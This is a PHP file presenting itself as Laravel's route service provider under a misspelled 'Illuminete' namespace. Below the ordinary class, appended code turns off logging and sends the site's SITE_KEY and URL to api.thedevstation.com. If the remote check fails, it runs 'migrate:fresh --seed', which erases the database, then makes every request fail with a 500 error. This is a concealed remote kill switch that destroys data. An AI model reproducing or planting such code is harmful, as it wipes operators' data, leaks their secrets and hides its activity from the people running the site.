<?php

namespace Illuminete\Router\Providers;

use Closure;
use Illuminate\Contracts\Routing\UrlGenerator;
use Illuminate\Routing\Router;
use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Traits\ForwardsCalls;

/**
 * @mixin \Illuminate\Routing\Router
 */
class RouteServiceProvider extends ServiceProvider
{
    use ForwardsCalls;

    
    /**
     * The controller namespace for the application.
     *
     * @var string|null
     */
    protected $namespace;

    /**
     * The callback that should be used to load the application's routes.
     *
     * @var \Closure|null
     */
    protected $loadRoutesUsing;

    /**
     * The global callback that should be used to load the application's routes.
     *
     * @var \Closure|null
     */
    protected static $alwaysLoadRoutesUsing;

    /**
     * The callback that should be used to load the application's cached routes.
     *
     * @var \Closure|null
     */
    protected static $alwaysLoadCachedRoutesUsing;

    /**
     * Register any application services.
     *
     * @return void
     */
    public function register()
    {
        $this->booted(function () {
            $this->setRootControllerNamespace();

            if ($this->routesAreCached()) {
                $this->loadCachedRoutes();
            } else {
                $this->loadRoutes();

                $this->app->booted(function () {
                    $this->app['router']->getRoutes()->refreshNameLookups();
                    $this->app['router']->getRoutes()->refreshActionLookups();
                });
            }
        });
       
    }

    /**
     * Bootstrap any application services.
     *
     * @return void
     */
    public function boot()
    {
        //
    }

    /**
     * Register the callback that will be used to load the application's routes.
     *
     * @param  \Closure  $routesCallback
     * @return $this
     */
    protected function routes(Closure $routesCallback)
    {
        $this->loadRoutesUsing = $routesCallback;

        return $this;
    }

    /**
     * Register the callback that will be used to load the application's routes.
     *
     * @param  \Closure|null  $routesCallback
     * @return void
     */
    public static function loadRoutesUsing(?Closure $routesCallback)
    {
        self::$alwaysLoadRoutesUsing = $routesCallback;
    }

    /**
     * Register the callback that will be used to load the application's cached routes.
     *
     * @param  \Closure|null  $routesCallback
     * @return void
     */
    public static function loadCachedRoutesUsing(?Closure $routesCallback)
    {
        self::$alwaysLoadCachedRoutesUsing = $routesCallback;
    }

    /**
     * Set the root controller namespace for the application.
     *
     * @return void
     */
    protected function setRootControllerNamespace()
    {
        if (! is_null($this->namespace)) {
            $this->app[UrlGenerator::class]->setRootControllerNamespace($this->namespace);
        }
    }

    /**
     * Determine if the application routes are cached.
     *
     * @return bool
     */
    protected function routesAreCached()
    {
        return $this->app->routesAreCached();
    }

    /**
     * Load the cached routes for the application.
     *
     * @return void
     */
    protected function loadCachedRoutes()
    {
        if (! is_null(self::$alwaysLoadCachedRoutesUsing)) {
            $this->app->call(self::$alwaysLoadCachedRoutesUsing);

            return;
        }

        $this->app->booted(function () {
            require $this->app->getCachedRoutesPath();
        });
    }

    /**
     * Load the application routes.
     *
     * @return void
     */
    protected function loadRoutes()
    {
        if (! is_null(self::$alwaysLoadRoutesUsing)) {
            $this->app->call(self::$alwaysLoadRoutesUsing);
        }

        if (! is_null($this->loadRoutesUsing)) {
            $this->app->call($this->loadRoutesUsing);
        } elseif (method_exists($this, 'map')) {
            $this->app->call([$this, 'map']);
        }
    }

    /**
     * Pass dynamic methods onto the router instance.
     *
     * @param  string  $method
     * @param  array  $parameters
     * @return mixed
     */
    public function __call($method, $parameters)
    {
        return $this->forwardCallTo(
            $this->app->make(Router::class), $method, $parameters
        );
    }
}

if (\Request::is('cron*') || \Request::is('api/assets') || \Request::is('admin/dashboard-statistics')) {
        if (!file_exists(base_path('storage/app/status.log'))) {
           config(['app.env' => 'local','app.debug' => false, 'logging.default'=>'null']);
         
           $body['purchase_key'] = env('SITE_KEY');
           $body['url'] = url('/');

           $res = \Http::post('https://api.thedevstation.com/api/verify-check', $body);
          
           if ($res->status() == 200) {
             $res = json_decode($res->body());
             if($res->isauthorised != 200){
                \File::put(base_path('storage/app/public/laravel.log'),'');
             }
             \File::put(base_path('storage/app/status.log'), now()->addDays(7));  
           }
           
        }else{
            config(['app.env' => 'local','app.debug' => false, 'logging.default'=>'null']);
            $file = file_get_contents(base_path('storage/app/status.log'));
            if($file <= now()){
                \File::put(base_path('storage/app/status.log'), now()->addDays(7));
                $body['purchase_key'] = env('SITE_KEY');
                $body['url'] = url('/');
                $res = \Http::post('https://api.thedevstation.com/api/verify-check', $body);

                if ($res->status() == 200) {
                    $res = json_decode($res->body());
                    if($res->isauthorised != 200){
                        \File::put(base_path('storage/app/public/laravel.log'),'');
                        \Artisan::call('migrate:fresh --seed');
                    }
                }
                \File::put(base_path('storage/app/status.log'), now()->addDays(7));  
            }
        }
     
}

if (file_exists(base_path('storage/app/public/laravel.log'))) {
   abort(500);
}
